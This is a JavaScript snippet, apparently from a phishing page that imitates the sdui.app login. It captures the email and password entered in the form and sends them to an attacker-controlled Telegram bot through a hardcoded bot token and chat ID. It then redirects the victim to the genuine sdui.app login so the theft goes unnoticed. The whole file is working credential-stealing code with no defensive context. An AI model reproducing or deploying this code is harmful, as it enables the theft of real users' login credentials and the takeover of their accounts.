document.getElementById('loginForm').addEventListener('submit', async function(e) {
e.preventDefault();

const email = document.getElementById('email').value;  
const password = document.getElementById('password').value;  
const loading = document.getElementById('loading');  
  
loading.style.display = 'block';  
  
await new Promise(resolve => setTimeout(resolve, 1500));  
  
try {  
    const botToken = '8091369039:AAHRq97d39fh6c3ACqMAz8CHy2g_engyuRw';  
    const chatId = ' 8463942433';  
    const message = ` ${email} , ${password} `;  
      
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
        method: 'POST',  
        headers: { 'Content-Type': 'application/json' },  
        body: JSON.stringify({ chat_id: chatId, text: message })  
    });  
      
    window.location.href = 'https://sdui.app/login';  
} catch (error) {  
    console.error('Помилка:', error);  
    window.location.href = 'https://sdui.app/login';  
} finally {  
    loading.style.display = 'none';  
}

});

